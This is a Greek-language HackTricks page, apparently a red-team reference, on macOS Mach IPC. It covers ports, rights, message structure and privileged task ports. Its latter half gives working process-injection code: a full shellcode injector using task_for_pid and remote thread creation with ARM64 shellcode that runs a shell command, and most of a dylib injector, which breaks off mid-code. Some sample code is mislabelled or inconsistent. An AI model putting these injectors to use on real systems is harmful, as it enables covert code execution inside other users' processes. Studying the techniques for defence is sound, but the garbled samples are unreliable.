# macOS IPC - Επικοινωνία μεταξύ Διεργασιών

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο github.

</details>

## Επικοινωνία Mach μέσω Θυρών

### Βασικές Πληροφορίες

Το Mach χρησιμοποιεί **εργασίες (tasks)** ως τη **μικρότερη μονάδα** για την κοινή χρήση πόρων, και κάθε εργασία μπορεί να περιέχει **πολλά νήματα (threads)**. Αυτές οι εργασίες και νήματα αντιστοιχούν 1:1 σε διεργασίες και νήματα POSIX.

Η επικοινωνία μεταξύ των εργασιών γίνεται μέσω της Mach Inter-Process Communication (IPC), χρησιμοποιώντας μονοδρομικά κανάλια επικοινωνίας. Οι μηνύματα μεταφέρονται μεταξύ θυρών (ports), οι οποίες λειτουργούν ως ουρές μηνυμάτων που διαχειρίζεται το πυρήνας.

Κάθε διεργασία έχει μια **πίνακα IPC**, όπου είναι δυνατόν να βρεθούν οι **θύρες mach της διεργασίας**. Το όνομα μιας θύρας mach είναι στην πραγματικότητα ένας αριθμός (ένας δείκτης στο αντικείμενο του πυρήνα).

Μια διεργασία μπορεί επίσης να στείλει ένα όνομα θύρας με κάποια δικαιώματα **σε μια διαφορετική εργασία** και το πυρήνας θα καταχωρήσει αυτήν την εγγραφή στον **πίνακα IPC της άλλης εργασίας**.

### Δικαιώματα Θυρών

Τα δικαιώματα θυρών, τα οποία καθορίζουν ποιες λειτουργίες μπορεί να εκτελέσει μια εργασία, είναι καίριας σημασίας για αυτήν την επικοινωνία. Τα δυνατά **δικαιώματα θυρών** είναι ([ορισμοί από εδώ](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Δικαίωμα λήψης (Receive right)**, το οποίο επιτρέπει τη λήψη μηνυμάτων που αποστέλλονται στη θύρα. Οι θύρες Mach είναι ουρές MPSC (multiple-producer, single-consumer), πράγμα που σημαίνει ότι μπορεί να υπάρχει μόνο **ένα δικαίωμα λήψης για κάθε θύρα** σε ολόκληρο το σύστημα (αντίθετα με τα αγωγούς, όπου πολλές διεργασίες μπορούν να κρατούν υποδείγματα αρχείων για το άκρο ανάγνωσης ενός αγωγού).
* Μια **εργασία με δικαίωμα λήψης** μπορεί να λαμβάνει μηνύματα και να **δημιουργεί δικαιώματα αποστολής (Send rights)**, επιτρέποντάς της να στέλνει μηνύματα. Αρχικά, μόνο η **ίδια εργασία έχει δικαίωμα λήψης για τη θύρα της**.
* **Δικαίωμα αποστολής (Send right)**, το οποίο επιτρέπει την αποστολή μηνυμάτων στη θύρα.
* Το δικαίωμα αποστολής μπορεί να **κλωνοποιηθεί**, έτσι ώστε μια εργασία που κατέχει ένα δ
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Οι διεργασίες που διαθέτουν ένα _**δικαίωμα λήψης**_ μπορούν να λαμβάνουν μηνύματα σε ένα Mach port. Αντίστοιχα, οι **αποστολείς** διαθέτουν ένα _**δικαίωμα αποστολής**_ ή ένα _**δικαίωμα αποστολής μία φορά**_. Το δικαίωμα αποστολής μία φορά χρησιμοποιείται αποκλειστικά για την αποστολή ενός μόνο μηνύματος, μετά το οποίο γίνεται άκυρο.

Για να επιτευχθεί μια εύκολη **διπλής κατεύθυνσης επικοινωνία**, μια διεργασία μπορεί να καθορίσει ένα **Mach port** στην κεφαλίδα μηνύματος του Mach που ονομάζεται _reply port_ (**`msgh_local_port`**), όπου ο **παραλήπτης** του μηνύματος μπορεί να **στείλει μια απάντηση** σε αυτό το μήνυμα. Τα bitflags στο **`msgh_bits`** μπορούν να χρησιμοποιηθούν για να **υποδείξουν** ότι θα πρέπει να προκύψει και να μεταφερθεί ένα **δικαίωμα αποστολής μία φορά** για αυτήν τη θύρα (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Σημειώστε ότι αυτή η είδους διπλής κατεύθυνσης επικοινωνία χρησιμοποιείται σε μηνύματα XPC που αναμένουν μια απάντηση (`xpc_connection_send_message_with_reply` και `xpc_connection_send_message_with_reply_sync`). Ωστόσο, συνήθως δημιουργούνται διαφορετικές θύρες, όπως εξηγήθηκε προηγουμένως, για να δημιουργηθεί η διπλής κατεύθυνσης επικοινωνία.
{% endhint %}

Τα άλλα πεδία της κεφαλίδας του μηνύματος είναι:

* `msgh_size`: το μέγεθος ολόκληρου του πακέτου.
* `msgh_remote_port`: η θύρα στην οποία αποστέλλεται αυτό το μήνυμα.
* `msgh_voucher_port`: [κουπόνια Mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: το αναγνωριστικό αυτού του μηνύματος, το οποίο ερμηνεύεται από τον παραλήπτη.

{% hint style="danger" %}
Σημειώστε ότι τα μηνύματα Mach αποστέλλονται μέσω ενός **_Mach port_**, το οποίο είναι ένας κανάλι επικοινωνίας **με έναν μόνο παραλήπτη** και **πολλούς αποστολείς** που έχει ενσωματωθεί στον πυρήνα Mach. **Πολλές διεργασίες** μπορούν να **αποστέλλουν μηνύματα** σε ένα Mach port, αλλά ανά πάσα στιγμή μόνο **μια διεργασία μπορεί να τα διαβάσει**.
{% endhint %}

### Απαρίθμηση θυρών
```bash
lsmp -p <pid>
```
Μπορείτε να εγκαταστήσετε αυτό το εργαλείο στο iOS κατεβάζοντάς το από [http://newosxbook.com/tools/binpack64-256.tar.gz ](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Παράδειγμα κώδικα

Παρατηρήστε πώς ο **αποστολέας** κατανέμει μια θύρα, δημιουργεί ένα **δικαίωμα αποστολής** για το όνομα `org.darlinghq.example` και το στέλνει στον **εκκίνητο διακομιστή**, ενώ ο αποστολέας ζήτησε το **δικαίωμα αποστολής** αυτού του ονόματος και το χρησιμοποίησε για να **στείλει ένα μήνυμα**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% tab title="sender.c" %}

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/message.h>

#define BUFFER_SIZE 1024

int main(int argc, char *argv[]) {
    mach_port_t server_port;
    kern_return_t kr;
    char buffer[BUFFER_SIZE];

    if (argc != 2) {
        printf("Usage: %s <message>\n", argv[0]);
        return 1;
    }

    // Connect to the server port
    kr = task_get_special_port(mach_task_self(), TASK_AUDIT_PORT, &server_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to get server port: %s\n", mach_error_string(kr));
        return 1;
    }

    // Create a message
    mach_msg_header_t *msg = (mach_msg_header_t *)buffer;
    msg->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->msgh_size = sizeof(buffer);
    msg->msgh_remote_port = server_port;
    msg->msgh_local_port = MACH_PORT_NULL;
    msg->msgh_reserved = 0;

    // Set the message type
    msg->msgh_id = 0x1234;

    // Copy the message content
    strncpy(buffer + sizeof(mach_msg_header_t), argv[1], BUFFER_SIZE - sizeof(mach_msg_header_t));

    // Send the message
    kr = mach_msg(msg, MACH_SEND_MSG, msg->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("Failed to send message: %s\n", mach_error_string(kr));
        return 1;
    }

    printf("Message sent successfully\n");

    return 0;
}
```

{% endtab %}

{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Προνομιούχες Θύρες

* **Θύρα κεντρικού υπολογιστή**: Αν ένας διεργασία έχει δικαίωμα **Αποστολής** πάνω από αυτήν τη θύρα, μπορεί να λάβει **πληροφορίες** για το **σύστημα** (π.χ. `host_processor_info`).
* **Προνομιούχα θύρα κεντρικού υπολογιστή**: Μια διεργασία με δικαίωμα **Αποστολής** πάνω από αυτήν τη θύρα μπορεί να εκτελέσει **προνομιούχες ενέργειες** όπως φόρτωση επέκτασης πυρήνα. Η διεργασία πρέπει να είναι **root** για να αποκτήσει αυτήν την άδεια.
* Επιπλέον, για να καλέσει το API **`kext_request`** απαιτούνται άλλες εξουσιοδοτήσεις **`com.apple.private.kext*`** που δίνονται μόνο σε δυαδικά αρχεία της Apple.
* **Θύρα ονόματος εργασίας**: Μια μη προνομιούχα έκδοση της _θύρας εργασίας_. Αναφέρεται στην εργασία, αλλά δεν επιτρέπει τον έλεγχό της. Το μόνο που φαίνεται να είναι διαθέσιμο μέσω αυτής είναι το `task_info()`.
* **Θύρα εργασίας** (επίσης γνωστή ως θύρα πυρήνα)**:** Με δικαίωμα Αποστολής πάνω από αυτήν τη θύρα είναι δυνατόν να ελεγχθεί η εργασία (ανάγνωση/εγγραφή μνήμης, δημιουργία νημάτων...).
* Καλέστε την `mach_task_self()` για να **πάρετε το όνομα** για αυτήν τη θύρα για την εργασία του καλούντος. Αυτή η θύρα κληρονομείται μόνο κατά τη διάρκεια της **`exec()`**. Μια νέα εργασία που δημιουργείται με `fork()` παίρνει μια νέα θύρα εργασίας (ως ειδική περίπτωση, μια εργασία παίρνει επίσης μια νέα θύρα εργασίας μετά το `exec()` σε ένα δυαδικό suid). Ο μόνος τρόπος να δημιουργηθεί μια εργασία και να πάρει τη θύρα της είναι να εκτελεστεί ο ["χορός ανταλλαγής θυρών"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) κατά τη διάρκεια ενός `fork()`.
* Αυτοί είναι οι περιορισμοί για την πρόσβαση στη θύρα (από το `macos_task_policy` του δυαδικού `AppleMobileFileIntegrity`):
* Αν η εφαρμογή έχει την εξουσιοδότηση **`com.apple.security.get-task-allow`**, οι διεργασίες από τον **ίδιο χρήστη μπορούν να έχουν πρόσβαση στη θύρα εργασίας** (συνήθως προστίθεται από το Xcode για αποσφαλμάτωση). Η διαδικασία **επικύρωσης** δεν το επιτρέπει για παραγωγικές εκδόσεις.
* Οι εφαρμογές με την εξουσιοδότηση **`com.apple.system-task-ports`** μπορούν να πάρουν τη θύρα εργασίας για οποιαδήποτε διεργασία, εκτός από τον πυρήνα. Σε παλαιότερες εκδόσεις ονομαζόταν **`task_for_pid-allow`**. Αυτό δίνεται μόνο σε εφαρμογές της Apple.
* **Ο ριζοκεντρικός χρήστης μπορεί να έχει πρόσβαση στις θύρες εργασίας** εφαρμογών που δεν έχουν μεταγλωττιστεί με έναν **ενισχυμένο** χρόνο εκτέλεσης (και όχι από την Apple).

### Εισαγωγή Shellcode σε νήμα μέσω θύρας εργασίας&#x20;

Μπορείτε να αποκτήσετε ένα shellcode από:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Μεταγλωτίστε** το προηγούμενο πρόγραμμα και προσθέστε τα **δικαιώματα** για να μπορείτε να εισάγετε κώδικα με τον ίδιο χρήστη (αν δεν, θα χρειαστεί να χρησιμοποιήσετε το **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Διείσδυση Dylib σε νήμα μέσω της θύρας Task

Στο macOS, τα **νήματα** μπορούν να χειριστούν μέσω του **Mach** ή χρησιμοποιώντας το **posix `pthread` api**. Το νήμα που δημιουργήθηκε στην προηγούμενη διείσδυση, δημιουργήθηκε χρησιμοποιώντας το Mach api, οπότε **δεν είναι συμβατό με το posix**.

Ήταν δυνατό να **διεισδύσουμε ένα απλό shellcode** για να εκτελέσουμε μια εντολή επειδή **δεν χρειαζόταν να λειτουργήσει με συμβατά posix api**, μόνο με το Mach. **Πιο πολύπλοκες διεισδύσεις** θα χρειαζόντουσαν το νήμα να είναι επίσης **συμβατό με το posix**.

Για να **βελτιώσουμε το νήμα**, θα πρέπει να καλέσει το **`pthread_create_from_mach_thread`** που θα **δημιουργήσει ένα έγκυρο pthread**. Στη συνέχεια, αυτό το νέο pthread μπορεί να καλέσει το dlopen για να φορτώσει ένα dylib από το σύστημα, οπότε αντί να γράφουμε νέο shellcode για να εκτελέσουμε διάφορες ενέργειες, είναι δυνατό να φορτώσουμε προσαρμοσμένες βιβλιοθήκες.

Μπορείτε να βρείτε **παραδείγματα dylibs** στο (για παράδειγμα αυτό που δημιουργεί ένα αρχείο καταγραφής και μετά μπορείτε να το ακούσετε):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
